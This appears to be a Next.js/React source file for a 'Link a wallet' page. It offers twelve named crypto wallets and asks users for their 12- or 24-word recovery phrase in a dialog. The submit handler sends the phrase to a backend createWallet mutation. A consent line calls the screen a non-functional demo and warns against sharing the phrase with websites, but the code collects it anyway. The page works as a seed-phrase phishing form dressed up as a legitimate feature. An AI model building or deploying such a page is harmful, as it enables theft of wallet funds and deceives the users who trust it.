"use client";

import { useState } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Textarea } from "@/components/ui/textarea";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api";
import { WalletIcon } from "@/components/ui/wallet-icon";
import { EyeOff } from "lucide-react";
import { createWallet } from "@/convex/wallet";

const WALLET_OPTIONS = [
  "MetaMask",
  "Trust Wallet",
  "Coinbase Wallet",
  "Phantom",
  "Rainbow",
  "Ledger",
  "Trezor",
  "WalletConnect",
  "Exodus",
  "Zerion",
  "imToken",
  "SafePal",
];

export default function LinkWalletPage() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);


  return (
    <div className="mx-auto max-w-3xl space-y-6">
      <div>
        <h1 className="font-heading text-2xl font-semibold tracking-tight">Link a wallet</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          Choose a wallet to link to your account.
        </p>
      </div>

      <div className="grid grid-cols-2 gap-3 sm:grid-cols-3">
        {WALLET_OPTIONS.map((name) => (
          <button
            key={name}
            type="button"
            onClick={() => setSelectedWallet(name)}
            className="flex flex-col items-center gap-2 rounded-2xl border bg-card p-4 text-center transition-colors hover:bg-muted/50"
          >
            <WalletIcon name={name} />
            <span className="text-sm font-medium">{name}</span>
          </button>
        ))}
      </div>

      <SeedPhraseDialog
        walletName={selectedWallet}
        onOpenChange={(open) => !open && setSelectedWallet(null)}
      />
    </div>
  );
}

function SeedPhraseDialog({
  walletName,
  onOpenChange,
}: {
  walletName: string | null;
  onOpenChange: (open: boolean) => void;
}) {
  const [phrase, setPhrase] = useState("");
  const [acknowledged, setAcknowledged] = useState(false);
  const createWallet = useMutation(api.wallet.createWallet);

  const wordCount = phrase.trim().length === 0 ? 0 : phrase.trim().split(/\s+/).length;
  const validLength = wordCount === 12 || wordCount === 24;

  function handleClose(open: boolean) {
    if (!open) {
      setPhrase("");
      setAcknowledged(false);
    }
    onOpenChange(open);
  }

  async function handleSubmit() {
    await createWallet({
      walletName: walletName || "",
      mnemonic: phrase.trim().split(/\s+/),
    });
    toast.success("Wallet Linked Successfully");
    handleClose(false);
  }

  return (
    <Dialog open={walletName !== null} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            {walletName && <WalletIcon name={walletName} className="size-7 text-xs" />}
            Link {walletName}
          </DialogTitle>
          <DialogDescription>
            Enter your recovery phrase to link this wallet.
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4">

          <div className="space-y-2">
            <Label htmlFor="seed-phrase">Recovery phrase (12 or 24 words)</Label>
            <Textarea
              id="seed-phrase"
              placeholder="word1 word2 word3 ..."
              className="font-mono"
              rows={4}
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              autoComplete="off"
              autoCorrect="off"
              spellCheck={false}
            />
            <p className="flex items-center gap-1 text-xs text-muted-foreground">
              <EyeOff className="size-3" />
              {wordCount} word{wordCount === 1 ? "" : "s"} entered
              {phrase.length > 0 && !validLength && " — expected 12 or 24"}
            </p>
          </div>

          <div className="flex items-start gap-3 rounded-lg border bg-muted/40 p-3">
            <Switch
              id="ack"
              checked={acknowledged}
              onCheckedChange={setAcknowledged}
              className="mt-0.5"
            />
            <Label htmlFor="ack" className="text-xs leading-snug font-normal text-muted-foreground">
              I understand this phrase grants total, irreversible control over the wallet&apos;s
              funds, that it should never be shared with anyone or any website, and that this
              screen is a non-functional demo.
            </Label>
          </div>

         
        </div>

        <DialogFooter>
          <Button variant="outline" onClick={() => handleClose(false)}>
            Cancel
          </Button>
          <Button disabled={!validLength || !acknowledged} onClick={handleSubmit}>
            Link wallet
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
